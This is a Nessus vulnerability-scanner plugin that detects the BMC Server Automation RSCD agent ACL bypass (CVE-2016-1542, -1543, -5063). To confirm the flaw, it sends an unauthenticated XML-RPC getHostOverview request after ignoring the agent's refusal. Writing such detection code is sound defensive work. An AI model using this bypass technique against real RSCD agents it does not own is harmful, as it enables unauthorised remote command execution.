#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90998);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/09/19 13:53:09 $");

  script_cve_id(
    "CVE-2016-1542",
    "CVE-2016-1543",
    "CVE-2016-5063"
  );
  script_osvdb_id(
    135336,
    140149
  );

  script_name(english:"BMC Server Automation RSCD Agent ACL Bypass");
  script_summary(english:"Bypasses ACL to execute XML-RPC commands.");

  script_set_attribute(attribute:"synopsis", value:
"The BMC Server Automation RSCD agent running on the remote host is
affected by a security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote BMC BladeLogic Server Automation (BSA) RSCD agent is
affected by a security bypass vulnerability due to a failure to
properly enforce the ACL. An unauthenticated, remote attacker can
exploit this, by ignoring the response to the RemoteServer.info
request, to bypass the ACL and execute XML-RPC commands.

MITRE has assigned three different CVE identifiers to this
vulnerability. CVE-2016-1542 and CVE-2016-1543 pertain to a variation
where the exports file is bypassed, and CVE-2016-5063 concerns a
variation where the users file is bypassed.

Note that CVE-2016-1542 and CVE-2016-1543 affect the Linux and Unix
variants of RSCD, and CVE-2016-5063 affects the Windows variant.");
  # https://docs.bmc.com/docs/display/bsa87/Notification+of+critical+security+issue+in+BMC+Server+Automation%2C+CVE-2016-1542%2C+CVE-2016-1543
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?49d62b3b");
  # https://docs.bmc.com/docs/display/bsa87/Notification+of+Windows+RSCD+Agent+vulnerability+in+BMC+Server+Automation+CVE-2016-5063
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?22c5cb82");
  # https://communities.bmc.com/community/bmcdn/bmc-devops/bmc_middleware_automation/blog/2016/03/02/bmc-server-automation-bsa-vulnerabilities-in-unixlinux-rscd-agent-cve-ids-cve-2016-1542-cve-2016-1543
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7e61055b");
  # http://www.troopers.de/events/troopers16/648_one_tool_to_rule_them_all_-_and_what_can_it_lead_to/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8412fa8e");
  # https://selfservice.bmc.com/casemgmt/sc_KnowledgeArticle?sfdcid=kA214000000dBpnCAE&type=Solution
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5d99b81e");
  script_set_attribute(attribute:"solution", value:
"The fix for the CVE-2016-1542 and CVE-2016-1543 issues is accomplished
by using a BMC Server Automation Compliance Template. Alternatively,
these issues can be mitigated by configuring a host-based firewall on
the affected system to only accept connections from the BSA
infrastructure systems. See the vendor advisory for more details.

The fix for the CVE-2016-5063 issue is accomplished by updating the
RSCD agent on the affected systems to version 8.7 P3 or 8.8, whichever
version is qualified to work with your Application Server.
Alternatively, it can be mitigated by configuring the exports file on
the affected system to only accept connections from the BSA
infrastructure systems. See the vendor advisory for more details.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/03/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2016/02/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/05/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:bmc:bladelogic_server_automation_rscd_agent");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("bmc_rscd_detect.nbin");
  script_require_ports(4750,"Services/bladelogic_rscd");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("x509_func.inc");
include("misc_func.inc");
include("byte_func.inc");
include("gunzip.inc");
include("bmc_rscd.inc");

appname = 'bladelogic_rscd';
port = get_service(svc:appname, default:4750, exit_on_fail:TRUE);
if(get_port_transport(port) != ENCAPS_IP) audit(AUDIT_LISTEN_NOT_VULN, appname, port);
if (!get_tcp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "tcp");

# Connect and send intro
soc = rscd_connect(type:"TLSRPC", port:port);
resp = send_xml_intro(soc:soc, port:port);

# If we are given access than we don't need to/can't bypass ACL
if (!isnull(resp))
{
  close(soc);
  exit(1, "RSCD's ACL does not exclude Nessus from issuing XML-RPC commands.");
}

payload = '<?xml version="1.0" encoding="UTF-8"?>\n' +
 '<methodCall>\n' +
 '  <methodName>RemoteServer.getHostOverview</methodName>\n' + 
 '</methodCall>';
send_xmlrpc(payload:payload, soc:soc, port:port);

# The response will have compressed XML
resp = recv(socket:soc, length:1024);
close(soc);

if ("HTTP/1.1 200 OK" >!< resp) audit(AUDIT_INST_VER_NOT_VULN, appname);

decompressed = decompress_payload(resp:resp);
if ("agentInstallDir" >!< decompressed) audit(AUDIT_RESP_BAD, port);

security_report_v4(
  port:port,
  severity:SECURITY_HOLE,
  request:make_list("https://" + get_host_ip() + ":" + port + "/xmlrpc"),
  cmd:"RemoteServer.getHostOverview",
  output:decompressed);
